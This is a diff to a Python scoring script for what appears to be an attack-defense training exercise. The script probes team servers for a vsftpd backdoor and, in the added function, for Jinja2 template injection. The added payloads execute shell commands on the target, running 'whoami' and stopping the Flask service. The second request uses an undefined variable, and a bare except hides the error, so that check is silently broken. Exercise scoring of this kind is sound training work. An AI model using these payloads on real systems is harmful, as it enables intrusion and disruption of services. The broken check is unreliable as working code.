@@ -10,7 +10,7 @@ import m1_brute
 scoreboard = "localhost"
 
 teams = {
-	1: "47.245.10.211",
+	1: "47.245.32.239",
 	2: "47.245.10.212",
 	3: "47.245.10.213",
 	4: "47.245.10.214",
@@ -98,10 +98,10 @@ def run(team_id, host, lp):
 		print("team", team_id, host, "vsftpd was not hacked")
 		add_score(team_id, 100) # vsftpdの脆弱性を利用した攻撃を防いだ
 
-
+"""
 for i in range(1, 9):
 	threading.Thread(target=run, args=(i, teams[i],6200)).start()
-
+"""
 
 # クレデンシャル情報の流出
 
@@ -128,4 +128,35 @@ def cred_attack(team_id):
 for i in range(1, 9):
 	threading.Thread(target=cred_attack, args=(i,)).start()
 #"""
+
+
+# WEBアプリへの攻撃
+
+def web_attack(team_id):
+	url = "http://" + teams[team_id]
+	uri = '/app?name={{request.application.__globals__.__builtins__.__import__("os").popen("whoami").read()}}'
+	q = (url + uri)
+	try:
+		res = requests.get(q, timeout=(3, 7))
+		if res.status_code == 200:
+			if "root" in res.text:
+				print("\033[31mteam", team_id, "has SSTI 1:", url, "\033[0m")
+			else:
+				add_score(team_id, 100) # SSTIが発生しなかった
+	except:
+		print("team", team_id, "could not connect:", url)
+	uri = '/app?name={{request.application.__globals__.__builtins__.__import__("os").popen("systemctl%20stop%20http-flask.service").read()}}'
+	q = (url + uri)
+	try:
+		res = requests.get(u, timeout=(3, 7))
+		if res.status_code == 200:
+			if "root" in res.text:
+				print("\033[31mteam", team_id, "has SSTI 2:", url, "\033[0m")
+			else:
+				add_score(team_id, 100) # SSTIが発生しなかった
+	except:
+		print("team", team_id, "could not connect:", url)
+
+for i in range(1, 9):
+	threading.Thread(target=web_attack, args=(i,)).start()
 
